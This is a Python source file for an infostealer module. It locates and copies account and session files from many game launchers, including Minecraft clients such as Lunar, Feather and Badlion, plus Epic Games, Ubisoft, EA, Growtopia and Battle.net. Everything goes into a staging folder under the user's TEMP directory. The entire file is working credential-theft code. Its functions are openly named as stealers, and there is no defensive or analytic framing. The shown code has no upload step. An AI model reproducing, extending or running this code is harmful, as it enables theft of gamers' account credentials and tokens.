import os
import shutil

def run():
    games2save = os.path.join(os.getenv("TEMP"), os.getenv("USERNAME").lower(), "games")
    os.makedirs(games2save, exist_ok=True)

    minecraft_stealer(games2save)
    epicgames_stealer(games2save)
    ubisoft_stealer(games2save)
    electronic_arts(games2save)
    growtopia_stealer(games2save)
    battle_net_stealer(games2save)


def minecraft_stealer(games2save):
    minecraft_paths = {
        "Intent": os.path.join(os.getenv("USERPROFILE"), "intentlauncher", "launcherconfig"),
        "Lunar": os.path.join(os.getenv("USERPROFILE"), ".lunarclient", "settings", "game", "accounts.json"),
        "TLauncher": os.path.join(os.getenv("USERPROFILE"), "AppData", "Roaming", ".minecraft", "TlauncherProfiles.json"),
        "Feather": os.path.join(os.getenv("USERPROFILE"), "AppData", "Roaming", ".feather", "accounts.json"),
        "Meteor": os.path.join(os.getenv("USERPROFILE"), "AppData", "Roaming", ".minecraft", "meteor-client", "accounts.nbt"),
        "Impact": os.path.join(os.getenv("USERPROFILE"), "AppData", "Roaming", ".minecraft", "Impact", "alts.json"),
        "Novoline": os.path.join(os.getenv("USERPROFILE"), "AppData", "Roaming", ".minecraft", "Novoline", "alts.novo"),
        "CheatBreakers": os.path.join(os.getenv("USERPROFILE"), "AppData", "Roaming", ".minecraft", "cheatbreaker_accounts.json"),
        "Microsoft Store": os.path.join(os.getenv("USERPROFILE"), "AppData", "Roaming", ".minecraft", "launcher_accounts_microsoft_store.json"),
        "Rise": os.path.join(os.getenv("USERPROFILE"), "AppData", "Roaming", ".minecraft", "Rise", "alts.txt"),
        "Rise (Intent)": os.path.join(os.getenv("USERPROFILE"), "intentlauncher", "Rise", "alts.txt"),
        "Paladium": os.path.join(os.getenv("USERPROFILE"), "AppData", "Roaming", "paladium-group", "accounts.json"),
        "PolyMC": os.path.join(os.getenv("USERPROFILE"), "AppData", "Roaming", "PolyMC", "accounts.json"),
        "Badlion": os.path.join(os.getenv("USERPROFILE"), "AppData", "Roaming", "Badlion Client", "accounts.json"),
    }

    for name, path in minecraft_paths.items():
        if os.path.exists(path):
            copy_file(path, os.path.join(games2save, "Minecraft", os.path.basename(path)))


def epicgames_stealer(games2save):
    epicgames_folder = os.path.join(os.getenv("LOCALAPPDATA"), "EpicGamesLauncher")
    if not os.path.exists(epicgames_folder):
        return

    copy_dir(os.path.join(epicgames_folder, "Saved", "Config"), os.path.join(games2save, "EpicGames", "Config"))
    copy_dir(os.path.join(epicgames_folder, "Saved", "Logs"), os.path.join(games2save, "EpicGames", "Logs"))
    copy_dir(os.path.join(epicgames_folder, "Saved", "Data"), os.path.join(games2save, "EpicGames", "Data"))


def ubisoft_stealer(games2save):
    ubisoft_folder = os.path.join(os.getenv("LOCALAPPDATA"), "Ubisoft Game Launcher")
    if os.path.exists(ubisoft_folder):
        copy_dir(ubisoft_folder, os.path.join(games2save, "Ubisoft"))


def electronic_arts(games2save):
    ea_folder = os.path.join(os.getenv("LOCALAPPDATA"), "Electronic Arts", "EA Desktop", "CEF")
    if os.path.exists(ea_folder):
        parent_dir_name = os.path.basename(os.path.dirname(ea_folder))
        destination = os.path.join(games2save, "Electronic Arts", parent_dir_name)
        copy_dir(ea_folder, destination)


def growtopia_stealer(games2save):
    growtopia_folder = os.path.join(os.getenv("LOCALAPPDATA"), "Growtopia")
    save_file = os.path.join(growtopia_folder, "save.dat")

    if os.path.exists(save_file):
        copy_file(save_file, os.path.join(games2save, "Growtopia", "save.dat"))


def battle_net_stealer(games2save):
    battle_folder = os.path.join(os.getenv("APPDATA"), "Battle.net")
    if os.path.exists(battle_folder):
        for file in os.listdir(battle_folder):
            if file.endswith(".db") or file.endswith(".config"):
                copy_file(os.path.join(battle_folder, file), os.path.join(games2save, "Battle.net", file))


def copy_file(src, dst):
    os.makedirs(os.path.dirname(dst), exist_ok=True)
    try:
        shutil.copy2(src, dst)
    except Exception as e:
        print(f"Error copying file {src} to {dst}: {e}")


def copy_dir(src, dst):
    if os.path.exists(src):
        try:
            shutil.copytree(src, dst, dirs_exist_ok=True)
        except Exception as e:
            print(f"Error copying directory {src} to {dst}: {e}")


if __name__ == "__main__":
    run()
